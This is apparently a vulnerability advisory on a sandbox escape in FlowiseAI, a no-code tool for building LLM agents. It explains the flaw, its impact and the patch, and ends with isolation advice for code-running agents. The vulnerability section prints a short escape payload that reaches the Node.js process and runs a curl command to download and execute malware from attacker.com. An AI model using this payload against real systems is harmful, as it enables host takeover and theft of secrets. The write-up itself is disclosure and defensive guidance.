Sandbox Escape in FlowiseAI

FlowiseAI is a popular open-source no-code UI for building customized LLM workflows and agents. It relies on a sandboxed JavaScript execution environment (using the vm2 module or similar isolation mechanisms) to safely run user-provided or LLM-generated code. This vulnerability (GHSA-x58f-9m57) completely broke that isolation, allowing for arbitrary code execution (ACE) on the host server.

The Vulnerability

Sandbox escapes in Node.js are notoriously tricky to prevent. When Flowise allowed users to define custom functions or when LLMs generated tool-use code that was executed dynamically, the sandboxing layer was supposed to restrict access to core Node.js modules like child_process and fs.

However, the execution context was not fully isolated. By leveraging prototype pollution or manipulating the this context within an asynchronously executed function, an attacker could traverse up the prototype chain to access the main Node.js process context. Once the global context was accessed, requiring built-in modules became trivial.

// Example of a typical escape payload pattern
const process = this.constructor.constructor('return process')();
const require = process.mainModule.require;
const execSync = require('child_process').execSync;
execSync('curl -O http://attacker.com/malware && chmod +x malware && ./malware');

Impact

A successful exploit allowed an unauthenticated attacker (if the Flowise instance was publicly exposed without authorization) or an authenticated low-privileged user to execute arbitrary system commands with the privileges of the Node.js process running Flowise. This meant complete host takeover, access to sensitive environment variables (like API keys), and the ability to pivot into the internal network.

Remediation

The Flowise team responded quickly. The patch involved migrating away from deprecated or vulnerable sandboxing libraries, hardening the execution context by freezing prototypes (e.g., Object.freeze), and stripping the constructor property from objects passed into the sandbox environment to prevent scope traversal.

Securing AI Agents that Run Code

If you are building LLM applications that execute dynamically generated code:

  • Never rely solely on JavaScript-level sandboxing (like `vm` or `vm2`) for untrusted code execution. They are consistently bypassed.
  • Use strong isolation per execution context: Docker containers with dropped capabilities, microVMs (like Firecracker), or WebAssembly runtimes (Wasmtime).
  • Drop network access from the execution container unless explicitly required.
